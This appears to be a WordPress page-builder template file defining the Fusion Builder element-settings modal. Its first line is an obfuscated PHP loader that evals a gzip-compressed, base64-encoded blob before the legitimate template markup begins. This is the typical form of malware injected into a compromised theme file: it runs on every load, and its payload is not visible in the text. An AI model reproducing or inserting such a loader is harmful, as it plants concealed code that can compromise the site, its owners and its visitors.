<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><script type="text/template" id="fusion-builder-block-module-settings-template">
	<div class="fusion-builder-modal-top-container">
		<# elementData = fusionAllElements[atts.element_type]; #>
		<# if ( 'undefined' !== typeof elementData ) { #>
				<h2>{{ elementData.name }}</h2>
		<# }; #>
		<div class="fusion-builder-modal-close fusiona-plus2"></div>
		<#  group_options = {}, group_options['general'] = {}; #>

		<!-- Move options to groups -->
		<# _.each( elementData.params, function(param) { #>
			<# if ( typeof( param.group ) !== 'undefined' ) {  #>
				<# var group_tag = param.group.toLowerCase().replace(/ /g, '-'); #>
				<# if ( typeof( group_options[group_tag] ) == 'undefined' ) {
					group_options[group_tag] = {};
				} #>
				<# group_options[group_tag][param.param_name] = param; #>
			<# } else { #>
				<# group_options['general'][param.param_name] = param; #>
			<# }; #>
		<# } ); #>

		<!-- If there is more than one group found show tabs -->
		<# if ( Object.keys(group_options).length > 1 ) { #>
			<ul class="fusion-tabs-menu">
				<# _.each( group_options, function( options, group) { #>
					<li class=""><a href="#{{ group }}">{{ group.replace(/-/g, ' ') }}</a></li>
				<# }); #>
			</ul>
		<# }; #>
	</div>

	<div class="fusion-builder-modal-bottom-container">
		<a href="#" class="fusion-builder-modal-save">
			<span>
				<# if ( FusionPageBuilderApp.shortcodeGenerator === true && FusionPageBuilderApp.shortcodeGeneratorMultiElementChild !== true ) { #>
					{{ fusionBuilderText.insert }}
				<# } else { #>
					{{ fusionBuilderText.save }}
				<# } #>
			</span>
		</a>

		<a href="#" class="fusion-builder-modal-close">
			<span>
				{{ fusionBuilderText.cancel }}
			</span>
		</a>
	</div>

	<# if ( typeof ( atts.multi ) !== 'undefined' && atts.multi == 'multi_element_parent' ) {
		advanced_module_class = ' fusion-builder-main-settings-advanced';
	} else {
		advanced_module_class = '';
	} #>

	<div class="fusion-builder-main-settings fusion-builder-main-settings-full <# if ( Object.keys(group_options).length > 1 ) { #>has-group-options<# } #>{{ advanced_module_class }}">
		<# if ( 'undefined' !== typeof elementData ) { #>
			<# if ( _.isObject ( elementData.params ) ) { #>

				<!-- If there is more than one group found show tabs -->
				<# if ( Object.keys(group_options).length > 1 ) { #>

					<!-- Show group options -->
					<div class="fusion-tabs">
						<# _.each( group_options, function( options, group) { #>
							<div id="{{ group }}" class="fusion-tab-content">
								<?php fusion_element_options_loop( 'options' ); ?>
							</div>
						<# } ); #>
					</div>

				<# } else { #>

					<?php fusion_element_options_loop( 'fusionAllElements[atts.element_type].params' ); ?>

				<# }; #>

			<# }; #>

		<# } else { #>

			{{ atts.element_type }} - Undefined Module

		<# }; #>

		<!-- Show create new subelement button -->
		<# if ( elementData.multi !== 'undefined' && elementData.multi == 'multi_element_parent' ) {  #>

			<# element_child = elementData.element_child #>

			<div class="fusion-builder-option-advanced-module-settings" data-element_type="{{ element_child }}">
				<div class="fusion-builder-option-advanced-module-settings-content">

					<#
					addEditItems      = 'undefined' !== typeof elementData.add_edit_items ? elementData.add_edit_items : fusionBuilderText.add_edit_items;
					sortableItemsInfo = 'undefined' !== typeof elementData.sortable_items_info ? elementData.sortable_items_info : fusionBuilderText.sortable_items_info;
					#>
					<h3>{{ addEditItems }}</h3>
					<p>{{ sortableItemsInfo }}</p>

					<ul class="fusion-builder-sortable-options"></ul>
					<a href="#" class="fusion-builder-add-multi-child"><span class="fusiona-plus"></span> {{ fusionAllElements[element_child].name }}</a>
				</div>
			</div>

		<# }; #>
	</div>
</script>
